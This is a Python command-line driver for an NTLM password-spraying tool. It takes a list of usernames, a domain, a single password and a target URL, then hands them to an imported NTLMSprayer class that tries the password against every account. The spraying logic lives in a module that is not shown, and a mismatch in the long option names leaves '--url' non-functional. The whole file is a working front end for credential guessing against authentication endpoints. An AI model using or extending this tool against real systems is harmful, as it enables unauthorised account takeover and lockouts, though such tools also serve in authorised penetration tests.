import sys
import ntlm_passwd_spray

from getopt import getopt, GetoptError

def main(argv) -> None:
    # Initialize string variables for later use
    userfile = None
    fqdn = None
    password = None
    url = None

    fail_str = "main.py -u <userfile> -f <fqdn> -p <password> -a <attack url>"

    # Check flags
    try:
        flags,_ = getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "url="])
    except GetoptError:
        print(fail_str)
        exit(1)
    
    for flag,arg in flags:
        if flag == "-h":
            print(fail_str)
        elif flag in ("-u", "--userfile"):
            userfile = str(arg)
        elif flag in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif flag in ("-p", "--password"):
            password = str(arg)
        elif flag in ("-a", "--attackurl"):
            url = str(arg)

    # Check if all required flags had values
    if userfile == None or fqdn == None or password == None or url == None:
        print(fail_str)
        exit(1)
    
    # Otherwise, proceed with attack
    spayer = ntlm_passwd_spray.NTLMSprayer(url, password, fqdn)
    spayer.load_userfile(userfile)
    spayer.password_spray()

if __name__ == "__main__":
    main(sys.argv[1:])